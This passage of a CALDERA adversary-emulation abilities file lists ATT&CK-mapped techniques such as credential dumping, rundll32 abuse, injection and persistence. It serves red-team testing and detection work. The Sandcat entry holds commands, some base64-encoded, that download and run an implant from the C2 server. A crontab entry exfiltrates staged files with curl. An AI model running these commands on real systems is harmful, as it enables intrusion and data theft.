        "technique_name": "OS Credential Dumping",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "f6c693da77b8824b3c52ba3b6ca0bf88",
        "technique_id": "T1003",
        "repeatable": false
    },
    {
        "description": "Find hostname of remote IP in domain",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Reverse nslookup IP",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "fa4ed735-7006-4451-a578-b516f80e559f",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Use Alternate Authentication Material: Pass the Ticket",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rubeus Kerberos Pass The Ticket",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "e0d59dde7cd701edd5144a01d622a5f2",
        "technique_id": "T1550.003",
        "repeatable": false
    },
    {
        "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rubeus asreproast",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "e66e4283978c8df9077696ace360a507",
        "technique_id": "T1558.004",
        "repeatable": false
    },
    {
        "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rubeus kerberoast",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "268f529c68280d4cbd0aa06cf6438be8",
        "technique_id": "T1558.003",
        "repeatable": false
    },
    {
        "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Run BloodHound from local disk",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "301c5fa0f27e0c63c2a3a0d14e043b83",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Run Bloodhound from Memory using Download Cradle",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "0ecc3d4729cf37c719528291d63f9f99",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of $env:TEMP\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Run Chrome-password Collector",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "24b8cc6c8e6c224a4f698ac3983d524d",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellerParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: DCSync",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Run DSInternals Get-ADReplAccount",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "ccf2af19610078752b4982a33b269f6f",
        "technique_id": "T1003.006",
        "repeatable": false
    },
    {
        "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Run PowerKatz",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection: Process Hollowing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "RunPE via VBA",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "557321faaf98c77b2b452cecd7b1de37",
        "technique_id": "T1055.012",
        "repeatable": false
    },
    {
        "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 advpack.dll Execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "bc4acf1b832d3e26002c7155453a4b4d",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 execute JavaScript Remote Payload With GetObject",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d68bca253560877e22685a3dd3ff4dd4",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 execute VBscript command",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "bc90f2994ce850e89f5ffc6101369329",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 execute VBscript command using Ordinal number",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "eca315e7b5064744f5bf5ffa39a7560c",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 ieadvpack.dll Execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0556cba95bf8acdff3c9c7b5e13443ce",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 setupapi.dll Execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ae21aefd2d9933df45a4e55485fbc333",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 syssetup.dll Execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "fe467fe47ac8270191a18d9811f734ce",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 with Control_RunDLL",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "12c0f2fbbae732e1deca4f23c8823a7a",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 with Ordinal Value",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5ecf2385ad32719a3cc72bed33c60b57",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Rundll32 with desk.cpl",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2030ccf9f80ce3020e4ee510fadeb0be",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "External Remote Services",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Running Chrome VPN Extensions via the Registry 2 vpn extension",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "03c06bf996733700b9bc025c7f5bc887",
        "technique_id": "T1133",
        "repeatable": false
    },
    {
        "description": "CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [
                    {
                        "description": "Deploy as a blue-team agent instead of red",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgYmx1ZSAm"
                    },
                    {
                        "description": "Download with a random name and start as a background process",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1zZXJ2ZXIgJHNlcnZlciAm"
                    },
                    {
                        "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang).",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczoje2FnZW50LmV4dGVuc2lvbnN9IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgPiAje2FnZW50cy5pbXBsYW50X25hbWV9O2NobW9kICt4ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Li8je2FnZW50cy5pbXBsYW50X25hbWV9IC1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgcmVkIC12"
                    },
                    {
                        "description": "Download with GIST C2",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczpnaXN0IiAtSCAiYzI6Z2lzdCIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtYzIgR0lTVCAtdg=="
                    },
                    {
                        "description": "Deploy as a P2P agent with known peers included in compiled agent",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczpwcm94eV9odHRwIiAtSCAiaW5jbHVkZVByb3h5UGVlcnM6SFRUUCIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtc2VydmVyICRzZXJ2ZXIgLWxpc3RlblAyUCAtdg=="
                    }
                ],
                "payloads": [],
                "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -group red -v",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Sandcat",
        "tactic": "command-and-control",
        "plugin": "sandcat",
        "ability_id": "2f34977d-9558-4c12-abad-349716777c6b",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "View all potential WIFI networks on host",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "9f639067-370a-40ba-b7ac-6f1c15d5a158"
                ],
                "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Scan WIFI networks",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "This ability exfiltrates the staged directory at a scheduled time.",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "crontab -l > /tmp/origcron;\ncrontab -l > /tmp/mycron;\necho \"0 12 * * * curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\" >> /tmp/mycron;\ncrontab /tmp/mycron;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/mycron;\ncrontab /tmp/origcron;\nrm /tmp/origcron;"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Scheduled Exfiltration",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "110cea7a-5b03-4443-92ee-7ccefaead451",
        "technique_id": "T1029",
        "repeatable": false
    },
    {
        "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "469f554b1c5e8613d3ec3662e9d9e3e1",
        "technique_id": "T1053.005",
        "repeatable": false
    },
    {
        "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Scheduled Task Startup Script",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5db2884b6ca3ab932848f295a3896dc0",
        "technique_id": "T1053.005",
        "repeatable": false
    },
    {
        "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Scheduled task Local",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "2e91cc775c1137720e978b906e2396fe",
        "technique_id": "T1053.005",
        "repeatable": false
    },
    {
        "description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Scheduled task Remote",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "fcbd91ebc012731e51a8d79264d49531",
        "technique_id": "T1053.005",
        "repeatable": false
    },
    {
        "description": "capture the contents of the screen",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Screen Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Screen Capture",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
        "technique_id": "T1113",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "ScreenConnect Application Download and Install on Windows",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "9332aff267b00ede37b09606340ee1dc",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Section View Injection",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5fef3e10a3e1113d7d31a26c03c5117a",
        "technique_id": "T1055",
        "repeatable": false
    },
    {
        "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Security Software Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "301c21998e9aac686942a33d328248e7",
        "technique_id": "T1518.001",
        "repeatable": false
    },
    {
        "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Security Software Discovery - AV Discovery via WMI",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "76147189e1a5880afa047d0869cf6d17",
        "technique_id": "T1518.001",
        "repeatable": false
    },
    {
        "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Security Software Discovery - Sysmon Service",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "33a24ff44719e6ac0614b58f8c9a7c72",
        "technique_id": "T1518.001",
        "repeatable": false
    },
    {
        "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like \"*\"} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like \"*\"},\nif you know the name of those processes.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Security Software Discovery - powershell",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "ed77c603f0d7c1fe3b19a9d4d9701158",
        "technique_id": "T1518.001",
        "repeatable": false
    },
    {
        "description": "Create a service named \"sandsvc\" to execute remote 54ndc57 binary named \"s4ndc4t.exe\"",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Services: Service Execution",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.no_backwards_movement"
            }
        ],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Service Creation",
        "tactic": "execution",
        "plugin": "stockpile",
        "ability_id": "95727b87-175c-4a69-8c7a-a5d82746a753",
        "technique_id": "T1569.002",
        "repeatable": false
    },
    {
        "description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Service ImagePath Change with reg.exe",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "3de4b86460576de0cab88993cb3f03cd",
        "technique_id": "T1574.011",
        "repeatable": false
    },
    {
        "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create or Modify System Process: Windows Service",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Service Installation CMD",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "732a2ad9a39ad8abffdc02c80246c32a",
        "technique_id": "T1543.003",
        "repeatable": false
    },
    {
        "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create or Modify System Process: Windows Service",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Service Installation PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "9b43c0d47dd2e7366c830755063df400",
